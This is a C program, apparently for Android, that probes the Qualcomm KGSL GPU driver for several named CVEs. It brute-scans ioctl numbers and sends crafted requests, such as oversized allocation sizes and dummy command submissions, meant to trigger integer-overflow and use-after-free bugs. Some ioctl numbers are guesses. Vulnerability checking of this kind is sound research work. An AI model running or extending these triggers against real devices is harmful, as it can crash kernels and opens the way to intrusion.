/*
 * kgsl_cve_check.c - check for known KGSL CVEs
 *
 * Target CVEs:
 * - CVE-2023-33063: KGSL timeline UAF
 * - CVE-2023-33107: KGSL integer overflow
 * - CVE-2024-23380: KGSL GPU command UAF
 * - CVE-2023-21106: KGSL dispatcher
 *
 * Build:
 * aarch64-linux-android31-clang -static -O2 -o kgsl_cve_check kgsl_cve_check.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>
#include <pthread.h>

/* Known KGSL ioctls */
#define KGSL_IOC_MAGIC 0x09

/* Timeline ioctls (CVE-2023-33063) */
#define IOCTL_TIMELINE_CREATE 0xc010095d // assumed number
#define IOCTL_TIMELINE_DESTROY 0x4004095e
#define IOCTL_TIMELINE_FENCE 0xc010095f
#define IOCTL_TIMELINE_SIGNAL 0x40080960
#define IOCTL_TIMELINE_WAIT 0xc0100961

/* GPU Command ioctls */
#define IOCTL_GPU_COMMAND 0xc0200949
#define IOCTL_GPU_AUX_COMMAND 0xc0200958

/* Memory ioctls */
#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_GPUMEM_ALLOC_ID 0xc0200933
#define IOCTL_SHAREDMEM_FROM_PMEM 0xc0200920

/* Dispatcher (CVE-2023-21106) */
#define IOCTL_CMDSTREAM_READTIMESTAMP 0xc0080911

int g_fd = -1;

void check_cve_2023_33063(int fd)
{
    printf("\n=== CVE-2023-33063: Timeline UAF ===\n");
    printf("[*] Looking for timeline-related ioctls...\n");

    /*
     * CVE-2023-33063 involves a UAF in kgsl_timeline
     * when the timeline is destroyed while an active fence still exists
     */

    // Scan the possible timeline ioctls
    uint64_t data[16] = {0};

    for (int nr = 0x5d; nr <= 0x65; nr++)
    {
        for (int dir = 0; dir < 4; dir++)
        {
            int cmd = ((0x40 + dir * 0x40) << 24) | (0x10 << 16) | (KGSL_IOC_MAGIC << 8) | nr;

            memset(data, 0, sizeof(data));
            errno = 0;
            int ret = ioctl(fd, cmd, data);

            if (ret == 0 || (errno != ENOTTY && errno != EINVAL))
            {
                printf("[+] Found: cmd=0x%08x, nr=0x%x, ret=%d, errno=%d\n",
                       cmd, nr, ret, errno);
            }
        }
    }

    // Try specific timeline operations
    struct
    {
        uint32_t context_id;
        uint32_t count;
        uint64_t padding[2];
    } timeline_req = {0};

    timeline_req.context_id = 0;
    timeline_req.count = 1;

    errno = 0;
    int ret = ioctl(fd, 0xc010095d, &timeline_req);
    printf("[*] Timeline create attempt: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));
}

void check_cve_2023_33107(int fd)
{
    printf("\n=== CVE-2023-33107: Integer Overflow ===\n");

    /*
     * CVE-2023-33107 involves an integer overflow in kgsl_ioctl_gpu_sparse_alloc_mem
     * when the (num_pages * sizeof(struct page*)) computation overflows
     */

    // Try sparse alloc (if it exists)
    // GPUMEM_ALLOC_ID may have a similar problem

    struct
    {
        uint32_t id;
        uint32_t flags;
        uint64_t size;
        uint32_t mmapsize;
        uint32_t padding;
        uint64_t gpuaddr;
        uint32_t metadata_len;
        uint32_t reserved[3];
    } alloc_req = {0};

    // Try to trigger the integer overflow
    // size = 0x7FFFFFFFFFFFFFF0 may make the num_pages computation overflow

    alloc_req.size = 0x7FFFFFFFFFFFFFF0ULL;
    alloc_req.flags = 0;

    errno = 0;
    int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC_ID, &alloc_req);
    printf("[*] GPUMEM_ALLOC_ID with huge size: ret=%d, errno=%d\n", ret, errno);

    // Try more integer boundary values
    uint64_t overflow_sizes[] = {
        0xFFFFFFFFFFFFF000ULL, // -0x1000
        0x8000000000000000ULL, // MIN_LONG
        0x0001000000000000ULL, // large page count
    };

    for (int i = 0; i < 3; i++)
    {
        alloc_req.size = overflow_sizes[i];
        errno = 0;
        ret = ioctl(fd, IOCTL_GPUMEM_ALLOC_ID, &alloc_req);
        printf("[*] Size 0x%lx: ret=%d, errno=%d\n",
               overflow_sizes[i], ret, errno);
    }
}

void check_cve_2024_23380(int fd)
{
    printf("\n=== CVE-2024-23380: GPU Command UAF ===\n");

    /*
     * CVE-2024-23380 involves a UAF during GPU command submission
     * when the command is cancelled but references still exist
     */

    // Try GPU_COMMAND
    struct
    {
        uint64_t flags;
        uint32_t cmdsize;
        uint32_t numcmds;
        uint64_t cmdlist;
        uint32_t objsize;
        uint32_t numobjs;
        uint64_t objlist;
        uint32_t syncsize;
        uint32_t numsyncs;
        uint64_t synclist;
        uint32_t context_id;
        uint32_t timestamp;
    } cmd_req = {0};

    // Create some buffers
    void *cmd_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    cmd_req.flags = 0;
    cmd_req.cmdsize = 0;
    cmd_req.numcmds = 0;
    cmd_req.cmdlist = (uint64_t)cmd_buf;
    cmd_req.context_id = 0;

    errno = 0;
    int ret = ioctl(fd, IOCTL_GPU_COMMAND, &cmd_req);
    printf("[*] GPU_COMMAND: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));

    // Try GPU_AUX_COMMAND
    struct
    {
        uint64_t flags;
        uint32_t cmdsize;
        uint32_t numcmds;
        uint64_t cmdlist;
        uint32_t objsize;
        uint32_t numobjs;
        uint64_t objlist;
        uint32_t context_id;
        uint32_t timestamp;
    } aux_req = {0};

    aux_req.context_id = 0;
    aux_req.cmdlist = (uint64_t)cmd_buf;

    errno = 0;
    ret = ioctl(fd, IOCTL_GPU_AUX_COMMAND, &aux_req);
    printf("[*] GPU_AUX_COMMAND: ret=%d, errno=%d (%s)\n",
           ret, errno, strerror(errno));
    printf("[*] aux output: flags=0x%lx, cmdsize=%u\n",
           aux_req.flags, aux_req.cmdsize);

    munmap(cmd_buf, 0x1000);
}

void check_dispatcher_race(int fd)
{
    printf("\n=== Dispatcher Race Condition Check ===\n");

    /*
     * Many KGSL vulnerabilities involve a race condition in the dispatcher
     * Try concurrent operations to trigger it
     */

    // READTIMESTAMP
    struct
    {
        uint32_t type;
        uint32_t timestamp;
        uint32_t context_id;
        uint32_t padding;
    } ts_req = {0};

    ts_req.type = 0; // KGSL_TIMESTAMP_RETIRED
    ts_req.context_id = 0;

    errno = 0;
    int ret = ioctl(fd, IOCTL_CMDSTREAM_READTIMESTAMP, &ts_req);
    printf("[*] READTIMESTAMP: ret=%d, errno=%d, ts=%u\n",
           ret, errno, ts_req.timestamp);

    // Try different timestamp types
    for (int type = 0; type < 5; type++)
    {
        ts_req.type = type;
        errno = 0;
        ret = ioctl(fd, IOCTL_CMDSTREAM_READTIMESTAMP, &ts_req);
        if (ret == 0)
        {
            printf("[+] Type %d: timestamp=%u\n", type, ts_req.timestamp);
        }
    }
}

void check_perfcounter_vuln(int fd)
{
    printf("\n=== Perfcounter Vulnerability Check ===\n");

    /*
     * KGSL perfcounter operations have had several vulnerabilities
     */

    // Try the perfcounter-related ioctls
    // nr 0x33 - GET_PERFCOUNTRREG
    // nr 0x3b - PERFCOUNTER_GET
    // nr 0x3c - PERFCOUNTER_PUT
    // nr 0x46 - PERFCOUNTER_QUERY

    struct
    {
        uint32_t groupid;
        uint32_t countable;
        uint32_t offset;
        uint32_t offset_hi;
    } perf_get = {0};

    // PERFCOUNTER_GET
    for (int grp = 0; grp < 5; grp++)
    {
        perf_get.groupid = grp;
        perf_get.countable = 0;

        errno = 0;
        int ret = ioctl(fd, 0xc010093b, &perf_get);
        if (ret == 0 || errno != ENOTTY)
        {
            printf("[+] PERFCOUNTER_GET group %d: ret=%d, errno=%d, offset=0x%x\n",
                   grp, ret, errno, perf_get.offset);
        }
    }

    // PERFCOUNTER_QUERY
    struct
    {
        uint32_t groupid;
        uint32_t countables;
        uint32_t max_counters;
        uint32_t reserved;
    } perf_query = {0};

    errno = 0;
    int ret = ioctl(fd, 0xc0100946, &perf_query);
    printf("[*] PERFCOUNTER_QUERY: ret=%d, errno=%d\n", ret, errno);
}

void scan_all_kgsl_ioctls(int fd)
{
    printf("\n=== Full KGSL ioctl Scan ===\n");

    int found = 0;

    // Scan all possible KGSL ioctls
    for (int nr = 0x00; nr <= 0xFF; nr++)
    {
        // Try different directions and sizes
        struct
        {
            int cmd;
            int dir;
            int size;
        } combos[] = {
            {0xc0040000 | (KGSL_IOC_MAGIC << 8) | nr, 3, 4},  // RW, 4 bytes
            {0xc0100000 | (KGSL_IOC_MAGIC << 8) | nr, 3, 16}, // RW, 16 bytes
            {0xc0200000 | (KGSL_IOC_MAGIC << 8) | nr, 3, 32}, // RW, 32 bytes
            {0x80040000 | (KGSL_IOC_MAGIC << 8) | nr, 2, 4},  // R, 4 bytes
            {0x40040000 | (KGSL_IOC_MAGIC << 8) | nr, 1, 4},  // W, 4 bytes
        };

        for (int c = 0; c < 5; c++)
        {
            uint64_t data[32] = {0};
            errno = 0;
            int ret = ioctl(fd, combos[c].cmd, data);

            if (ret == 0)
            {
                printf("[+] nr=0x%02x cmd=0x%08x: SUCCESS\n", nr, combos[c].cmd);
                found++;
                break; // skip once one is found
            }
            else if (errno != ENOTTY && errno != EINVAL)
            {
                printf("[?] nr=0x%02x cmd=0x%08x: errno=%d (%s)\n",
                       nr, combos[c].cmd, errno, strerror(errno));
            }
        }
    }

    printf("[*] Found %d potentially interesting ioctls\n", found);
}

int main(int argc, char **argv)
{
    printf("=== KGSL CVE Check ===\n");
    printf("======================\n");

    g_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_fd < 0)
    {
        printf("[-] Cannot open: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened fd=%d\n", g_fd);

    if (argc > 1 && strcmp(argv[1], "-scan") == 0)
    {
        scan_all_kgsl_ioctls(g_fd);
    }
    else
    {
        check_cve_2023_33063(g_fd);
        check_cve_2023_33107(g_fd);
        check_cve_2024_23380(g_fd);
        check_dispatcher_race(g_fd);
        check_perfcounter_vuln(g_fd);
    }

    close(g_fd);
    return 0;
}
